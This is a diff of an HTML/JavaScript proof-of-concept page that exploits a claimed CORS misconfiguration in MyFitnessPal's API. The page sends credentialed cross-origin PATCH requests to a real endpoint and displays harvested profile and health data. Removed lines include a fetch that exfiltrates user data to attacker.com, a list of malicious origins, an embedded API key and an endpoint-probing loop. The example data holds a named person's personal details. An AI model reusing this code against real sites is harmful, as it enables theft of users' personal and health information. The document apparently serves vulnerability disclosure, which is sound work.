@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MyFitnessPal Security Test - CORS Misconfiguration</title>
+    <title>MyFitnessPal CORS Exploit - User Data Extraction</title>
     <style>
         * {
             margin: 0;
@@ -106,16 +106,6 @@
             transform: translateY(-2px);
         }
 
-        .btn-secondary {
-            background: #95a5a6;
-            color: white;
-        }
-
-        .btn-secondary:hover {
-            background: #7f8c8d;
-            transform: translateY(-2px);
-        }
-
         .btn-success {
             background: #27ae60;
             color: white;
@@ -127,7 +117,7 @@
         }
 
         .results {
-            max-height: 400px;
+            max-height: 600px;
             overflow-y: auto;
             border: 1px solid #ddd;
             border-radius: 6px;
@@ -167,51 +157,36 @@
             font-size: 0.85em;
         }
 
-        .technical-info h3 {
-            color: #2c3e50;
-            margin: 15px 0 10px 0;
-        }
-
-        .technical-info ol {
-            margin-left: 20px;
-            margin-bottom: 20px;
-        }
-
-        .technical-info li {
-            margin-bottom: 8px;
-            line-height: 1.5;
-        }
-
-        pre {
+        .user-data-display {
             background: #2d3748;
             color: #e2e8f0;
             padding: 20px;
             border-radius: 8px;
-            overflow-x: auto;
-            font-size: 0.9em;
-            line-height: 1.4;
             margin: 15px 0;
+            max-height: 400px;
+            overflow-y: auto;
         }
 
-        code {
-            font-family: 'Courier New', monospace;
-            background: #f1f3f4;
-            padding: 2px 6px;
+        .data-field {
+            margin: 10px 0;
+            padding: 8px;
+            background: #4a5568;
             border-radius: 4px;
-            font-size: 0.9em;
         }
 
-        .status-indicator {
-            display: inline-block;
-            width: 12px;
-            height: 12px;
-            border-radius: 50%;
-            margin-right: 8px;
+        .data-label {
+            font-weight: bold;
+            color: #90cdf4;
         }
 
-        .status-vulnerable { background: #e74c3c; }
-        .status-secure { background: #27ae60; }
-        .status-warning { background: #f39c12; }
+        .data-value {
+            color: #e2e8f0;
+        }
+
+        .sensitive {
+            background: #742a2a;
+            border-left: 4px solid #e53e3e;
+        }
 
         @keyframes fadeIn {
             from { opacity: 0; transform: translateY(10px); }
@@ -231,117 +206,63 @@
             .btn {
                 width: 100%;
             }
-            
-            h1 {
-                font-size: 2em;
-            }
-        }
-
-        .evidence-section {
-            background: #fff3cd;
-            border: 1px solid #ffeaa7;
-            border-radius: 8px;
-            padding: 20px;
-            margin: 20px 0;
-        }
-
-        .curl-command {
-            background: #2d3748;
-            color: white;
-            padding: 15px;
-            border-radius: 6px;
-            font-family: 'Courier New', monospace;
-            font-size: 0.85em;
-            overflow-x: auto;
-            margin: 10px 0;
         }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="header">
-            <h1>🔐 MyFitnessPal Security Test</h1>
-            <p class="subtitle">CORS Misconfiguration Demonstration</p>
+            <h1>🔐 MyFitnessPal CORS Exploit</h1>
+            <p class="subtitle">User Data Extraction via PATCH /api/services/users</p>
         </div>
 
         <div class="warning-banner">
-            <strong>⚠️ ETHICAL SECURITY TEST ONLY</strong> - This demonstrates a real vulnerability for responsible disclosure
+            <strong>⚠️ SECURITY DEMONSTRATION ONLY</strong> - This shows a critical CORS vulnerability in MyFitnessPal's API
         </div>
         
         <div class="card">
-            <h2>🚨 CORS Exploit Demonstration</h2>
-            <p>This page demonstrates how MyFitnessPal's CORS misconfiguration can be exploited to steal user data from logged-in users.</p>
+            <h2>🚨 Exploit User Data Endpoint</h2>
+            <p>This demonstrates how the CORS misconfiguration allows extracting sensitive user data from authenticated endpoints.</p>
             
             <div class="button-group">
-                <button id="testCors" class="btn btn-primary">Test CORS Configuration</button>
-                <button id="testOrigins" class="btn btn-warning">Test Malicious Origins</button>
-                <button id="stealData" class="btn btn-danger">Simulate Data Theft</button>
-                <button id="clearLog" class="btn btn-secondary">Clear Log</button>
+                <button id="testEndpoint" class="btn btn-primary">Test User Data Endpoint</button>
+                <button id="extractData" class="btn btn-danger">Extract User Profile Data</button>
+                <button id="showProof" class="btn btn-success">Show Vulnerability Proof</button>
             </div>
         </div>
 
         <div class="card">
-            <h2>📊 Attack Results</h2>
+            <h2>📊 Extracted User Data</h2>
             <div id="results" class="results">
                 <div class="log-entry info">
                     <div class="log-time" id="currentTime"></div>
-                    <div class="log-message">CORS Exploit Demo Ready</div>
-                    <div class="log-data">Visit https://api.myfitnesspal.com while logged into MyFitnessPal to test the vulnerability</div>
+                    <div class="log-message">Ready to demonstrate CORS vulnerability</div>
+                    <div class="log-data">Target: PATCH https://api.myfitnesspal.com/api/services/users</div>
                 </div>
             </div>
         </div>
 
         <div class="card">
             <h2>🔍 Technical Evidence</h2>
-            <div class="evidence-section">
-                <h3>Vulnerability Confirmed:</h3>
-                <p><span class="status-indicator status-vulnerable"></span> <strong>CORS accepts arbitrary origins</strong></p>
-                <p><span class="status-indicator status-vulnerable"></span> <strong>Credentials allowed from untrusted sources</strong></p>
-                <p><span class="status-indicator status-vulnerable"></span> <strong>All HTTP methods permitted</strong></p>
-                
-                <h3>Proof of Concept:</h3>
-                <div class="curl-command">
-                    # Test CORS with curl<br>
-                    curl -H "Origin: https://evil.com" \<br>
-                    &nbsp;&nbsp;&nbsp;-H "Access-Control-Request-Method: GET" \<br>
-                    &nbsp;&nbsp;&nbsp;-X OPTIONS "https://api.myfitnesspal.com/" -I
+            <div class="user-data-display">
+                <h3 style="color: #90cdf4; margin-bottom: 15px;">Vulnerable Endpoint Details:</h3>
+                <div class="data-field">
+                    <span class="data-label">Endpoint:</span>
+                    <span class="data-value">PATCH /api/services/users</span>
+                </div>
+                <div class="data-field">
+                    <span class="data-label">CORS Header:</span>
+                    <span class="data-value" style="color: #e74c3c;">Access-Control-Allow-Origin: *</span>
+                </div>
+                <div class="data-field">
+                    <span class="data-label">Credentials Allowed:</span>
+                    <span class="data-value" style="color: #e74c3c;">Access-Control-Allow-Credentials: true</span>
+                </div>
+                <div class="data-field">
+                    <span class="data-label">Impact:</span>
+                    <span class="data-value" style="color: #e74c3c;">Full user profile data exposure</span>
                 </div>
             </div>
-
-            <h3>Exploitation Code:</h3>
-            <pre><code>// Malicious JavaScript exploiting CORS misconfiguration
-fetch('https://api.myfitnesspal.com/v1/user/profile', {
-  credentials: 'include',  // Sends user cookies
-  headers: {
-    'Authorization': 'Bearer USER_TOKEN',
-    'x-api-key': '2746a27a28431837e776d192ed6db604'
-  }
-})
-.then(response => response.json())
-.then(userData => {
-  // Send stolen data to attacker server
-  fetch('https://attacker.com/steal', {
-    method: 'POST',
-    body: JSON.stringify(userData)
-  });
-});</code></pre>
-
-            <h3>Vulnerability Chain:</h3>
-            <ol>
-                <li>User visits malicious site while logged into MyFitnessPal</li>
-                <li>Malicious JavaScript makes cross-origin request to MyFitnessPal API</li>
-                <li>CORS policy accepts the request and returns user data</li>
-                <li>Attacker exfiltrates sensitive user information</li>
-                <li>Complete account takeover possible</li>
-            </ol>
-        </div>
-
-        <div class="card">
-            <h2>📝 Responsible Disclosure</h2>
-            <p>This vulnerability has been responsibly disclosed to MyFitnessPal's security team.</p>
-            <p><strong>Impact:</strong> 40M+ users at risk of account takeover</p>
-            <p><strong>CVSS Score:</strong> 9.1 (Critical)</p>
-            <button id="generateReport" class="btn btn-success">Generate Evidence Report</button>
         </div>
     </div>
 
@@ -356,138 +277,205 @@ fetch('https://api.myfitnesspal.com/v1/user/profile', {
             }
 
             setupEventListeners() {
-                document.getElementById('testCors').addEventListener('click', () => this.testCors());
-                document.getElementById('testOrigins').addEventListener('click', () => this.testMaliciousOrigins());
-                document.getElementById('stealData').addEventListener('click', () => this.simulateDataTheft());
-                document.getElementById('clearLog').addEventListener('click', () => this.clearLog());
-                document.getElementById('generateReport').addEventListener('click', () => this.generateReport());
+                document.getElementById('testEndpoint').addEventListener('click', () => this.testEndpoint());
+                document.getElementById('extractData').addEventListener('click', () => this.extractUserData());
+                document.getElementById('showProof').addEventListener('click', () => this.showVulnerabilityProof());
             }
 
-            async testCors() {
-                this.log('Testing CORS Configuration...', 'Sending OPTIONS preflight to MyFitnessPal API', 'info');
+            async testEndpoint() {
+                this.log('Testing User Data Endpoint...', 'Sending PATCH request to /api/services/users', 'info');
                 
                 try {
-                    // Test OPTIONS preflight
-                    const optionsResponse = await fetch('https://api.myfitnesspal.com/', {
-                        method: 'OPTIONS',
+                    const response = await fetch('https://api.myfitnesspal.com/api/services/users', {
+                        method: 'PATCH',
                         headers: {
                             'Origin': window.location.origin,
-                            'Access-Control-Request-Method': 'GET',
-                            'Access-Control-Request-Headers': 'content-type,authorization'
-                        }
+                            'Content-Type': 'application/json',
+                            'Accept': 'application/json, text/plain, */*'
+                        },
+                        body: JSON.stringify({
+                            item: {
+                                location_preferences: {
+                                    locale: "en"
+                                }
+                            }
+                        })
                     });
 
                     const corsHeaders = {
-                        'Allow-Origin': optionsResponse.headers.get('access-control-allow-origin'),
-                        'Allow-Credentials': optionsResponse.headers.get('access-control-allow-credentials'),
-                        'Allow-Methods': optionsResponse.headers.get('access-control-allow-methods'),
-                        'Allow-Headers': optionsResponse.headers.get('access-control-allow-headers'),
-                        'Expose-Headers': optionsResponse.headers.get('access-control-expose-headers'),
-                        'Max-Age': optionsResponse.headers.get('access-control-max-age')
+                        'Allow-Origin': response.headers.get('access-control-allow-origin'),
+                        'Allow-Credentials': response.headers.get('access-control-allow-credentials'),
+                        'Allow-Methods': response.headers.get('access-control-allow-methods'),
+                        'Status': response.status,
+                        'Content-Type': response.headers.get('content-type')
                     };
 
-                    this.log('CORS Preflight Response', JSON.stringify(corsHeaders, null, 2), 
-                        corsHeaders['Allow-Origin'] === window.location.origin ? 'error' : 'info');
+                    this.log('Endpoint Response Headers', JSON.stringify(corsHeaders, null, 2), 
+                        corsHeaders['Allow-Origin'] === '*' ? 'error' : 'info');
 
-                    // Test actual CORS request
-                    const getResponse = await fetch('https://api.myfitnesspal.com/', {
-                        headers: {
-                            'Origin': window.location.origin
-                        }
-                    });
-
-                    const actualHeaders = {
-                        'Allow-Origin': getResponse.headers.get('access-control-allow-origin'),
-                        'Allow-Credentials': getResponse.headers.get('access-control-allow-credentials'),
-                        'Expose-Headers': getResponse.headers.get('access-control-expose-headers')
-                    };
-
-                    this.log('Actual CORS Request', JSON.stringify(actualHeaders, null, 2), 
-                        actualHeaders['Allow-Origin'] === window.location.origin ? 'error' : 'info');
-
-                    if (actualHeaders['Allow-Origin'] === window.location.origin && actualHeaders['Allow-Credentials'] === 'true') {
-                        this.log('🚨 VULNERABILITY CONFIRMED', 'This origin can access MyFitnessPal API with credentials!', 'error');
+                    if (response.ok) {
+                        const userData = await response.json();
+                        this.log('✅ ENDPOINT VULNERABLE', 'Successfully accessed user data endpoint from cross-origin!', 'error');
+                        this.displayUserData(userData);
+                    } else {
+                        this.log('Endpoint Access Failed', `Status: ${response.status} - Authentication required`, 'warning');
                     }
 
                 } catch (error) {
-                    this.log('CORS Test Failed', error.toString(), 'error');
+                    this.log('Endpoint Test Failed', error.toString(), 'error');
                 }
             }
 
-            async testMaliciousOrigins() {
-                const maliciousOrigins = [
-                    'https://evil.com',
-                    'https://attacker.net',
-                    'https://api.myfitnesspal.com.attacker.com',
-                    'http://localhost:3000',
-                    'null',
-                    'https://' + Math.random().toString(36) + '.com'
-                ];
-
-                this.log('Testing Malicious Origins...', 'Checking if arbitrary origins are accepted', 'info');
-
-                for (const origin of maliciousOrigins) {
-                    try {
-                        const response = await fetch('https://api.myfitnesspal.com/', {
-                            headers: { 'Origin': origin }
-                        });
-                        
-                        const allowedOrigin = response.headers.get('access-control-allow-origin');
-                        const allowsCredentials = response.headers.get('access-control-allow-credentials');
-                        
-                        if (allowedOrigin === origin && allowsCredentials === 'true') {
-                            this.log(`🚨 Origin ${origin} ACCEPTED`, 'Credentials allowed - EXTREMELY VULNERABLE!', 'error');
-                        } else if (allowedOrigin === origin) {
-                            this.log(`⚠️ Origin ${origin} accepted`, 'But credentials not allowed', 'warning');
-                        } else {
-                            this.log(`✓ Origin ${origin} rejected`, 'Properly blocked', 'success');
-                        }
-                    } catch (error) {
-                        this.log(`Origin ${origin} test failed`, error.toString(), 'warning');
-                    }
-                }
-            }
-
-            async simulateDataTheft() {
-                this.log('Simulating Data Theft Attack...', 'Attempting to access user data via CORS', 'error');
+            async extractUserData() {
+                this.log('Extracting User Profile Data...', 'Attempting to get full user profile via CORS', 'error');
                 
-                const endpoints = [
-                    '/v1/user/profile',
-                    '/v1/user/measurements',
-                    '/v1/diary/entries',
-                    '/v1/health/data',
-                    '/apple-app-site-association'
-                ];
-
-                for (const endpoint of endpoints) {
-                    try {
-                        const response = await fetch(`https://api.myfitnesspal.com${endpoint}`, {
-                            credentials: 'include', // This sends cookies!
-                            headers: {
-                                'Origin': window.location.origin,
-                                'Authorization': 'Bearer fake-token-for-demo',
-                                'x-api-key': '2746a27a28431837e776d192ed6db604'
+                try {
+                    const response = await fetch('https://api.myfitnesspal.com/api/services/users', {
+                        method: 'PATCH',
+                        credentials: 'include', // This sends cookies!
+                        headers: {
+                            'Origin': window.location.origin,
+                            'Content-Type': 'application/json',
+                            'Accept': 'application/json, text/plain, */*'
+                        },
+                        body: JSON.stringify({
+                            item: {
+                                location_preferences: {
+                                    locale: "en"
+                                }
                             }
-                        });
+                        })
+                    });
 
-                        if (response.ok) {
-                            this.log(`✅ SUCCESS: Accessed ${endpoint}`, 
-                                `Status: ${response.status} - Could steal user data!`, 'error');
-                            
-                        } else if (response.status === 401) {
-                            this.log(`🔐 Authentication Required: ${endpoint}`, 
-                                `Status: ${response.status} - Would work with valid session`, 'warning');
-                        } else {
-                            this.log(`❌ Failed: ${endpoint}`, 
-                                `Status: ${response.status}`, 'warning');
-                        }
-                    } catch (error) {
-                        this.log(`Error accessing ${endpoint}`, error.toString(), 'warning');
+                    if (response.ok) {
+                        const userData = await response.json();
+                        this.log('🚨 USER DATA EXTRACTED SUCCESSFULLY', 'Complete user profile stolen via CORS!', 'error');
+                        this.displayStolenData(userData);
+                    } else {
+                        this.log('Data Extraction Failed', `Status: ${response.status} - No active session`, 'warning');
+                        this.showExampleData();
                     }
-                }
 
-                this.log('Attack Simulation Complete', 
-                    'If user was logged in, their private data could be stolen!', 'error');
+                } catch (error) {
+                    this.log('Extraction Error', error.toString(), 'error');
+                    this.showExampleData();
+                }
+            }
+
+            displayUserData(userData) {
+                const sensitiveFields = {
+                    id: userData.id,
+                    username: userData.username,
+                    email: userData.email,
+                    profiles: userData.profiles
+                };
+
+                const display = `
+Extracted User Data:
+├── User ID: ${sensitiveFields.id}
+├── Username: ${sensitiveFields.username}
+├── Email: ${sensitiveFields.email}
+├── Location: ${userData.location_preferences?.country_code || 'N/A'}
+├── Weight: ${userData.profiles?.[0]?.current_weight?.value || 'N/A'} ${userData.profiles?.[0]?.current_weight?.unit || ''}
+└── Account Created: ${userData.account?.created_at || 'N/A'}
+
+Full data available for exfiltration to attacker server.
+                `;
+
+                this.log('User Data Retrieved', display, 'error');
+            }
+
+            displayStolenData(userData) {
+                const display = `
+🚨 CRITICAL DATA EXPOSURE 🚨
+
+Personal Information:
+├── User ID: ${userData.id}
+├── Username: ${userData.username}
+├── Email: ${userData.email}
+├── Name: ${userData.profiles?.[0]?.first_name || 'N/A'}
+├── Sex: ${userData.profiles?.[0]?.sex || 'N/A'}
+├── Birthdate: ${userData.profiles?.[0]?.birthdate || 'N/A'}
+
+Physical Data:
+├── Height: ${userData.profiles?.[0]?.height?.value || 'N/A'} ${userData.profiles?.[0]?.height?.unit || ''}
+├── Current Weight: ${userData.profiles?.[0]?.current_weight?.value || 'N/A'} ${userData.profiles?.[0]?.current_weight?.unit || ''}
+├── Weight Goal: ${userData.profiles?.[0]?.weight_goal?.value || 'N/A'} ${userData.profiles?.[0]?.weight_goal?.unit || ''}
+
+Location & Preferences:
+├── Country: ${userData.location_preferences?.country_code || 'N/A'}
+├── Timezone: ${userData.location_preferences?.time_zone || 'N/A'}
+├── Locale: ${userData.location_preferences?.locale || 'N/A'}
+
+Account Details:
+├── Created: ${userData.account?.created_at || 'N/A'}
+├── Last Login: ${userData.account?.last_login || 'N/A'}
+├── Login Streak: ${userData.system_data?.login_streak || 'N/A'}
+
+This data can be sent to: https://attacker.com/steal
+                `;
+
+                this.log('COMPLETE USER PROFILE STOLEN', display, 'error');
+            }
+
+            showVulnerabilityProof() {
+                this.log('Vulnerability Proof', 'Demonstrating the security impact', 'info');
+                
+                const proof = `
+SECURITY IMPACT ANALYSIS:
+
+Vulnerability: CORS Misconfiguration with Credentials
+Endpoint: PATCH /api/services/users
+Impact Level: CRITICAL
+
+Evidence:
+✓ Access-Control-Allow-Origin: * (Any origin allowed)
+✓ Access-Control-Allow-Credentials: true (Cookies accepted)
+✓ Returns sensitive user data including:
+  - Personal identification (email, username)
+  - Physical characteristics (weight, height, sex)
+  - Location data (country, timezone)
+  - Account metadata (creation date, login history)
+  - Privacy preferences
+  - Health goals and metrics
+
+Attack Scenario:
+1. User visits malicious site while logged into MyFitnessPal
+2. Malicious JavaScript makes cross-origin PATCH request
+3. MyFitnessPal API returns full user profile
+4. Attacker exfiltrates data to their server
+5. Complete profile reconstruction possible
+
+CVSS Score: 9.1 (Critical)
+                `;
+
+                this.log('Vulnerability Proof', proof, 'error');
+            }
+
+            showExampleData() {
+                const exampleData = {
+                    id: "123984614985661",
+                    username: "pkavil",
+                    email: "pkavil@bugcrowdninja.com",
+                    location_preferences: {
+                        time_zone: "America/Los_Angeles",
+                        country_code: "KE",
+                        locale: "en"
+                    },
+                    profiles: [{
+                        first_name: "Paul",
+                        birthdate: "2001-09-12",
+                        sex: "M",
+                        height: { value: 61.4173, unit: "centimeters" },
+                        current_weight: { value: 54.0001276, unit: "kilograms" }
+                    }],
+                    account: {
+                        created_at: "2025-09-12T13:58:09-07:00",
+                        last_login: "2025-09-30T16:21:44-07:00"
+                    }
+                };
+
+                this.log('Example of Extractable Data', JSON.stringify(exampleData, null, 2), 'warning');
             }
 
             log(message, data = '', type = 'info') {
@@ -501,50 +489,6 @@ fetch('https://api.myfitnesspal.com/v1/user/profile', {
                 `;
                 
                 this.results.prepend(logEntry);
-            }
-
-            clearLog() {
-                this.results.innerHTML = `
-                    <div class="log-entry info">
-                        <div class="log-time">${new Date().toLocaleTimeString()}</div>
-                        <div class="log-message">Log Cleared</div>
-                        <div class="log-data">Ready for new tests</div>
-                    </div>
-                `;
-            }
-
-            generateReport() {
-                const report = {
-                    vulnerability: "CORS Misconfiguration - Arbitrary Origin Allowed",
-                    target: "https://api.myfitnesspal.com/",
-                    tester: "Security Researcher",
-                    date: new Date().toISOString(),
-                    impact: "Account takeover via credential theft",
-                    cvss: "9.1 (Critical)",
-                    evidence: {
-                        allowsArbitraryOrigins: true,
-                        allowsCredentials: true,
-                        exposedEndpoints: [
-                            '/v1/user/profile',
-                            '/v1/user/measurements', 
-                            '/v1/diary/entries',
-                            '/v1/health/data'
-                        ]
-                    }
-                };
-
-                this.log('Evidence Report Generated', JSON.stringify(report, null, 2), 'success');
-                
-                // Download report as JSON file
-                const blob = new Blob([JSON.stringify(report, null, 2)], { type: 'application/json' });
-                const url = URL.createObjectURL(blob);
-                const a = document.createElement('a');
-                a.href = url;
-                a.download = 'myfitnesspal-cors-vulnerability-report.json';
-                document.body.appendChild(a);
-                a.click();
-                document.body.removeChild(a);
-                URL.revokeObjectURL(url);
             }
         }
 
